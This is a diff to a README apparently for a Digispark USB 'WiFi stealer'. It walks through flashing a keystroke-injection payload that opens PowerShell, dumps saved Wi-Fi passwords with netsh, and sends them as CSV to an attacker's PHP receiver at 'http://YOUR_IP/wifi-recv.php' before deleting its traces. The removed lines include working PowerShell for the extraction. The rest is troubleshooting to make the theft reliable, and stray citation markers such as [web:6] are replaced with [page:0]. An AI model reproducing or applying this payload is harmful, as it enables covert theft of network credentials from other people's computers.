@@ -53,7 +53,7 @@ curl -X POST http://localhost/wifi-recv.php -d "data=test"
 cat /var/www/html/wifi_creds.log
 ```
 
-If you see `data=test` in the output, the server is working.[web:6]
+If you see `data=test` in the output, the server is working.[page:0]
 
 Open:
 
@@ -135,32 +135,38 @@ http://digistump.com/package_digistump_index.json
 
 ### Uploading the payload
 
-1. Open:
+1. Open the Digispark payload sketch:
 
 ```text
 payloads/wifi_stealer_digispark.ino
 ```
 
-2. Find this line and change the IP address:
+2. In the sketch, find the line that defines the receiver URL and change the IP address:
 
 ```cpp
-DigiKeyboard.print(
-  F("Invoke-WebRequest -UseBasicParsing -Uri 'http://YOUR_IP/wifi-recv.php' -Method POST -Body $b")
-);
+$u='http://YOUR_IP/wifi-recv.php';
 ```
 
-Change `YOUR_IP` to the IP of your Kali or Windows server.
+Replace `YOUR_IP` with the IP of your Kali or Windows server (for example `http://192.168.1.8/wifi-recv.php` if you are on the same LAN).
 
-3. Click **Upload**.
-4. When Arduino IDE says `Plug in device now...`, plug in the Digispark.
-5. Wait for the upload to finish.
+3. Make sure the payload contains the Wi‑Fi extraction and POST logic that sends **raw CSV** to `wifi-recv.php`, in this format:
+
+- Export Wi‑Fi profiles to `%TEMP%` using `netsh wlan export profile`.
+- Parse each `Wi-Fi-*.xml` file to build objects with properties: `Time, SSID, Pass, IP, OS`.
+- Export these objects as CSV to something like `%TEMP%\w.csv`.
+- Use `Invoke-WebRequest` to POST the contents of that CSV as the body to `http://YOUR_IP/wifi-recv.php`.
+- Delete the XML and CSV files and exit PowerShell when done.
+
+4. Click **Upload** in Arduino IDE.
+5. When Arduino IDE says `Plug in device now...`, plug in the Digispark.
+6. Wait for the upload to finish.
 
 After flashing, plugging the Digispark into a Windows machine will:
 
 - Open PowerShell.
-- Read saved WiFi profiles.
-- Send the captured data to your PHP receiver.
-- Close out when finished.
+- Read saved WiFi profiles and extract the passwords.
+- Send the captured data to your PHP receiver as CSV.
+- Clean up the temp files it created.
 - Blink the onboard LED to signal it’s done.
 
 ---
@@ -236,19 +242,19 @@ Most of the time the server is fine and the issue is on the Windows / payload si
   cat /var/www/html/wifi_creds.log
   ```
 
-  If you see `data=test` in the log, the PHP script and permissions are OK.[web:6]
+  If you see `data=test` in the log, the PHP script and permissions are OK.[page:0]
 
 - If nothing is written:
   - Make sure Apache is running:  
     `sudo systemctl status apache2`
   - Check the log file exists and is writable:  
-    `ls -l /var/www/html/wifi_creds.log` and fix ownership/permissions as in the setup section.[web:65]
+    `ls -l /var/www/html/wifi_creds.log` and fix ownership/permissions as in the setup section.[page:0]
 
 ---
 
 ### PowerShell error: “Unable to connect to the remote server”
 
-This means Windows can’t reach your server at the URL you used in `Invoke-WebRequest`, not that the PowerShell logic is broken.[web:59][web:61]
+This means Windows can’t reach your server at the URL you used in `Invoke-WebRequest`, not that the PowerShell logic is broken.[page:0]
 
 On the Windows machine, in PowerShell:
 
@@ -264,7 +270,7 @@ Test-NetConnection YOUR_IP -Port 8080
 
 - If `ping` fails or `TcpTestSucceeded : False`, either:
   - Windows and the server are not on the same network, or
-  - A firewall is blocking the connection.[web:64][web:67]
+  - A firewall is blocking the connection.[page:0]
 
 Also double‑check the URL:
 
@@ -272,13 +278,7 @@ Also double‑check the URL:
   `http://YOUR_IP/wifi-recv.php`
 - Only use `:8080` if you configured Apache to listen on 8080 and tested it in a browser first.
 
-If manual tests work, make sure the **same URL** is used in your `.ino`:
-
-```cpp
-DigiKeyboard.print(
-  F("Invoke-WebRequest -UseBasicParsing -Uri 'http://YOUR_IP/wifi-recv.php' -Method POST -Body $b")
-);
-```
+If manual tests work, make sure the **same URL** is used in your Digispark sketch wherever you define `$u`.
 
 Reflash the Digispark after any IP/URL change.
 
@@ -286,66 +286,27 @@ Reflash the Digispark after any IP/URL change.
 
 ### PowerShell error: “You cannot call a method on a null-valued expression”
 
-This usually comes from the WiFi profile parsing line when a regex doesn’t match some `netsh` output lines, so `.Matches[...]` is `$null` and `.Value.Trim()` crashes.[web:80][web:75]
+This usually comes from the WiFi profile parsing line when a regex or split doesn’t match some `netsh` output lines, so you end up calling a property or method on `$null`.[page:0]
 
-A fragile version looks like:
-
-```powershell
-$profiles = netsh wlan show profiles |
-  Select-String "All User Profile\s+:\s+(.+)" |
-  %{ $_.Matches.Value.Trim() }[1]
-```
-
-To avoid this, the project uses a safer approach that doesn’t depend on complex regex groups:
+Use the safer approach the project is based on:
 
 ```powershell
 $profiles = (netsh wlan show profiles) |
   Select-String "All User Profile" |
   ForEach-Object {
-    $_.Line.Split(':').Trim()[1]
+    $_.Line.Split(':').Trim()
   }
 ```
 
-This just finds lines containing `All User Profile`, splits on `:`, and trims the right side (the SSID).[web:76][web:15]
+This just finds lines containing `All User Profile`, splits on `:`, and trims the right side (the SSID).
 
-If you ever hit the null‑valued expression error:
-
-1. Run the WiFi extraction commands step‑by‑step in a PowerShell window on your test machine:
-
-   ```powershell
-   $csvPath = "$env:TEMP\temp.csv"
-   $ip  = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
-   $os  = (Get-CimInstance Win32_OperatingSystem).Caption
-
-   $profiles = (netsh wlan show profiles) |
-     Select-String "All User Profile" |
-     ForEach-Object { $_.Line.Split(':').Trim() }[1]
-
-   $wifi = foreach($p in $profiles) {
-     $dump = netsh wlan show profile name="$p" key=clear
-     $pass = $dump |
-       Select-String "Key Content" |
-       ForEach-Object { $_.Line.Split(':').Trim() }[1]
-
-     [PSCustomObject]@{
-       SSID = $p
-       Pass = $pass
-       IP   = $ip
-       OS   = $os
-     }
-   }
-
-   $wifi | Export-Csv $csvPath -NoTypeInformation
-   type $csvPath
-   ```
-
-2. Once this works and the CSV looks correct, mirror those **exact** commands into the Digispark sketch as separate `DigiKeyboard.print(...)` lines with small delays between them.
+If you ever hit the null‑valued expression error, run the WiFi extraction commands step‑by‑step in a PowerShell window on your test machine, fix them there, then mirror the **exact** working commands back into the Digispark sketch.
 
 ---
 
 ### CSV looks good on Windows, but dashboard is still empty
 
-If `type %TEMP%\temp.csv` (or `type $csvPath`) on Windows shows valid data, but nothing appears in the dashboard:
+If `type` (or `Get-Content`) of your CSV on Windows shows valid data, but nothing appears in the dashboard:
 
 - Manually POST the CSV from PowerShell:
 
@@ -362,15 +323,15 @@ If `type %TEMP%\temp.csv` (or `type $csvPath`) on Windows shows valid data, but 
 
 If this manual POST writes to the log, the PHP side is fine. Then the issue is:
 
-- Wrong IP/URL hard‑coded in the `.ino`, or
-- HID keystrokes being dropped because the Digispark is typing too fast.[web:84][web:85]
+- Wrong IP/URL hard‑coded in the Digispark sketch, or
+- HID keystrokes being dropped because the Digispark is typing too fast.[page:0]
 
 **Keystroke / timing tips:**
 
 - Add longer delays after heavy commands:
   - 1500–4000 ms after the `netsh`/WiFi loop and `Export-Csv`
   - 1500–2000 ms after `Invoke-WebRequest`
-- Avoid one huge PowerShell line. Split it into multiple lines (like in this project), each sent by `DigiKeyboard.print(...)` + ENTER. This is much more reliable with Digispark HID.[web:37][web:72]
+- Avoid one huge PowerShell line if your Digispark becomes unreliable. Splitting the command into multiple logical lines, each sent by `DigiKeyboard.print(...)` + ENTER with a small delay, is more stable.
 
 ---
 
@@ -380,8 +341,8 @@ If this manual POST writes to the log, the PHP side is fine. Then the issue is:
 - Try a different USB port or a short USB extension cable.
 - Confirm `Digispark (Default – 16.5 MHz)` is selected under **Tools → Board**.
 - Common compile issues:
-  - Make sure there is only one `.ino` in the sketch folder (Arduino compiles all `.ino` files together).
-  - Ensure `#include "DigiKeyboard.h"` is at the top of the file and not inside any string or comment.[web:69][web:37]
+  - Make sure there is only one `.ino` in the sketch folder.
+  - Ensure `#include "DigiKeyboard.h"` is at the top of the file.
 
 ---
 
